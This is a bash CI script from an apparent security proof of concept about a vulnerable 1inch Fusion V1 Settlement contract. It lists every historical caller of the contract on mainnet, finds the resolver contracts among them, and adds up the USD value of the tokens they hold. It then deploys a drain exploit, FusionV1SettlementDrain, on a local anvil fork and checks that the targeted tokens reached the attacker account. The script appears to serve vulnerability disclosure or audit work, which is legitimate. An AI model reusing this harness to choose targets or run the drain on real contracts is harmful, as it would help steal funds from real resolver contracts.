#!/usr/bin/env bash
# C-23 heavy job (CI): enumerate every historical caller/target of the vulnerable
# 1inch Settlement and value the resolver-contract candidates.
# Read-only. Results -> c-23/ci-out/.
set -uo pipefail
cd "$(dirname "$0")/.."   # c-23/
mkdir -p ci-out
# Some CI secrets are stored with literal surrounding quotes; strip them.
clean_url() {
  local u="$1"
  u="${u%\"}"; u="${u#\"}"
  u="${u%\'}"; u="${u#\'}"
  printf '%s' "$u"
}
RPC=$(clean_url "${FORK_RPC_URL:-${RPC_URL:-https://ethereum-rpc.publicnode.com}}")
echo "[ci] RPC host: $(echo "$RPC" | sed 's|https://||;s|/.*||')"

python3 - "$RPC" <<'PY' | tee ci-out/enumeration.log
import json, sys, time, urllib.request
RPC = sys.argv[1]
SETTLEMENT = "0xa88800cd213da5ae406ce248380802bd53b47647"
HDR = {"User-Agent": "zombie-ci-c23", "Content-Type": "application/json"}

def rpc(method, params):
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    for _ in range(4):
        try:
            req = urllib.request.Request(RPC, data=body, headers=HDR)
            return json.load(urllib.request.urlopen(req, timeout=40)).get("result")
        except Exception:
            time.sleep(1.5)
    return None

def bs(url, tries=6):
    for i in range(tries):
        try:
            return json.load(urllib.request.urlopen(urllib.request.Request(url, headers=HDR), timeout=45))
        except Exception as e:
            print("   bs retry", i, str(e)[:50], flush=True)
            time.sleep(min(20, 2 ** i))
    return {}

# ---- 1. all top-level callers of settleOrders (unique `from`) -----------------
print("== enumerating top-level txs to Settlement ==", flush=True)
base = f"https://eth.blockscout.com/api/v2/addresses/{SETTLEMENT}/transactions?filter=to"
cur, pages, senders = base, 0, {}
while cur and pages < 1500:
    d = bs(cur)
    if not d:
        break
    for it in d.get("items", []):
        f = (it.get("from") or {}).get("hash")
        if f:
            senders.setdefault(f, 0)
            senders[f] += 1
    pages += 1
    nxt = d.get("next_page_params")
    if not nxt:
        break
    q = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in nxt.items())
    cur = base + "&" + q
    time.sleep(0.15)
print("pages", pages, "unique senders", len(senders), flush=True)

# ---- 2. all ERC-20 senders to Settlement -------------------------------------
print("== enumerating token-transfer senders to Settlement ==", flush=True)
base2 = f"https://eth.blockscout.com/api/v2/addresses/{SETTLEMENT}/token-transfers?type=ERC-20"
cur, pages2, tsenders = base2, 0, {}
while cur and pages2 < 600:
    d = bs(cur)
    if not d:
        break
    for it in d.get("items", []):
        to = (it.get("to") or {}).get("hash") or ""
        f = (it.get("from") or {}).get("hash")
        if to.lower() == SETTLEMENT and f:
            tsenders.setdefault(f, {"n": 0, "tok": (it.get("token") or {}).get("address_hash")})
            tsenders[f]["n"] += 1
    pages2 += 1
    nxt = d.get("next_page_params")
    if not nxt:
        break
    q = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in nxt.items())
    cur = base2 + "&" + q
    time.sleep(0.15)
print("pages", pages2, "unique token senders", len(tsenders), flush=True)

# ---- 3. code scan: resolveOrders selector (0x1944799f) -----------------------
cands = sorted(set(list(senders) + list(tsenders)))
print("== code scan of", len(cands), "addresses ==", flush=True)
scan = {}
for i, a in enumerate(cands):
    code = rpc("eth_getCode", [a, "latest"]) or "0x"
    size = (len(code) - 2) // 2
    scan[a] = {"size": size, "resolveOrders": "1944799f" in code}
    if i % 100 == 0:
        print("  scanned", i, flush=True)
    time.sleep(0.05)
ro = {a: v for a, v in scan.items() if v["resolveOrders"]}
print("contracts:", sum(1 for v in scan.values() if v["size"] > 0), "with resolveOrders:", len(ro), flush=True)
for a, v in ro.items():
    print("  RO", a, v, flush=True)

json.dump({"top_senders": senders, "token_senders": tsenders, "code_scan": scan},
          open("ci-out/settlement_enumeration.json", "w"), indent=1)

# ---- 4. token balances + USD for every resolveOrders contract ----------------
print("== balances for resolveOrders contracts ==", flush=True)

def balances(addr):
    cur = f"https://eth.blockscout.com/api/v2/addresses/{addr}/tokens?type=ERC-20"
    items, pages = [], 0
    while cur and pages < 40:
        d = bs(cur)
        if not d:
            break
        for it in d.get("items", []):
            t = it.get("token") or {}
            try:
                v = int(it.get("value") or 0)
            except Exception:
                v = 0
            er = t.get("exchange_rate")
            dec = int(t.get("decimals") or 0)
            usd = None
            try:
                if er is not None and v > 0:
                    usd = float(er) * v / 10 ** dec
            except Exception:
                pass
            if v > 0:
                items.append({"tok": (t.get("address_hash") or "").lower(), "sym": t.get("symbol"),
                              "dec": dec, "bal": str(v), "rate": er, "usd": usd,
                              "rep": t.get("reputation")})
        pages += 1
        nxt = d.get("next_page_params")
        if not nxt:
            break
        q = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in nxt.items())
        cur = f"https://eth.blockscout.com/api/v2/addresses/{addr}/tokens?type=ERC-20&" + q
        time.sleep(0.35)
    return items

import time as _t
val = {}
grand = 0.0
t0=_t.time()
for a in ro:
    if _t.time()-t0 > 900:
        print("balance budget exhausted", flush=True); break
    items = balances(a)
    tot = sum(i["usd"] for i in items if i["usd"])
    val[a] = {"items": items, "total_usd_blockscout": tot}
    grand += tot
    print(f"{a} tokens={len(items)} usd(blockscout)={tot:.2f}", flush=True)
json.dump(val, open("ci-out/resolver_balances.json", "w"), indent=1)
print(f"TOTAL blockscout-priced USD across resolveOrders contracts: {grand:.2f}", flush=True)
PY

# ---------------------------------------------------------------------------
# Anvil end-to-end proof: deploy the single-file constructor exploit on a local
# fork with anvil's default funded account and show the captured tokens arrived.
# ---------------------------------------------------------------------------
echo "[ci] === anvil end-to-end proof ==="
ANVIL_RPC=$(clean_url "${BLOCKPI_RPC_URL:-${NODEREAL_ETH_RPC_URL:-${FORK_RPC_URL:-${RPC_URL:-https://ethereum-rpc.publicnode.com}}}}")
E2E_LOG="ci-out/anvil-e2e.log"
E2E_OK=1
CAPTURED_TOPIC=$(cast keccak "Captured(address,address,uint256)")
{
  echo "== anvil E2E $(date -u +%FT%TZ)"
  echo "fork rpc host: $(echo "$ANVIL_RPC" | sed 's|https://||;s|/.*||')"

  # anvil default account 0 (public test key, never funded on mainnet)
  DEPLOYER=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
  ANVIL_PORT=8545
  anvil --fork-url "$ANVIL_RPC" --port $ANVIL_PORT --silent > ci-out/anvil-server.log 2>&1 &
  ANVIL_PID=$!
  READY=0
  for i in $(seq 1 90); do
    if cast block-number --rpc-url http://127.0.0.1:$ANVIL_PORT >/dev/null 2>&1; then READY=1; break; fi
    if ! kill -0 $ANVIL_PID 2>/dev/null; then break; fi
    sleep 1
  done
  if [ "$READY" -ne 1 ]; then
    echo "anvil failed to start (pid $ANVIL_PID); server log:"
    sed -n '1,20p' ci-out/anvil-server.log
    E2E_OK=0
  else
    echo "anvil pid $ANVIL_PID ready at block $(cast block-number --rpc-url http://127.0.0.1:$ANVIL_PORT 2>/dev/null)"

  # key tokens the drain is expected to capture (live balances may vary)
  TOKENS="0xf21661d0d1d76d3ecb8e1b9f1c923dbfffae4097 0xb753428af26e81097e7fd17f40c88aaa3e04902c 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f 0xcf0c122c6b73ff809c693db761e7baebe62b6a2e 0x1a7e4e63778b4f12a199c062f3efdd288afcbce8 0xc08512927d12348f6620a698105e1baac6ecd911 0x68749665ff8d2d112fa859aa293f07a622782f38 0x5f98805a4e8be255a32880fdec7f6728c6568ba0 0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce"
  declare -A BEFORE
  for t in $TOKENS; do
    BEFORE[$t]=$(cast call $t "balanceOf(address)(uint256)" $DEPLOYER --rpc-url http://127.0.0.1:$ANVIL_PORT 2>/dev/null | awk '{print $1}')
  done

  echo "== forge create (constructor-only exploit, gas-limit 29M)"
  OUT=$(cd poc && forge create --rpc-url http://127.0.0.1:$ANVIL_PORT --unlocked --from $DEPLOYER \
        --value 100 --gas-limit 29000000 --broadcast \
        src/FusionV1SettlementDrain.sol:FusionV1SettlementDrain 2>&1)
  echo "$OUT"
  TX=$(echo "$OUT" | grep -oE "Transaction hash: 0x[0-9a-fA-F]{64}" | awk '{print $3}' | head -1)
  if [ -n "$TX" ]; then
    cast receipt "$TX" --rpc-url http://127.0.0.1:$ANVIL_PORT 2>/dev/null | grep -iE "gasUsed|status" || true
    echo "captured events: $(cast receipt "$TX" --json --rpc-url http://127.0.0.1:$ANVIL_PORT 2>/dev/null | python3 -c "
import json,sys
try:
    d=json.load(sys.stdin)
    print(sum(1 for l in d.get('logs',[]) if l.get('topics') and l['topics'][0].lower()=='$CAPTURED_TOPIC'))
except Exception:
    print('?')
" 2>/dev/null)"
  else
    echo "WARNING: could not parse deployment tx hash"
  fi

  echo "== deployer token deltas (key tokens)"
  GAINS=0
  for t in $TOKENS; do
    A=$(cast call $t "balanceOf(address)(uint256)" $DEPLOYER --rpc-url http://127.0.0.1:$ANVIL_PORT 2>/dev/null | awk '{print $1}')
    if [ "$A" != "${BEFORE[$t]}" ]; then
      echo "  +$A  (was ${BEFORE[$t]})  $t"
      GAINS=$((GAINS+1))
    fi
  done
    echo "key tokens gained: $GAINS"

    if [ "$GAINS" -eq 0 ]; then
      echo "ANVIL E2E FAILED: no token captured"
      E2E_OK=0
    else
      echo "ANVIL E2E OK"
    fi
  fi
  kill $ANVIL_PID 2>/dev/null || true
  wait $ANVIL_PID 2>/dev/null || true
} > "$E2E_LOG" 2>&1
cat "$E2E_LOG"
if [ "$E2E_OK" -ne 1 ]; then
  echo "[ci] anvil E2E FAILED" >&2
  exit 1
fi

echo "[ci] done; files:"; ls -la ci-out/
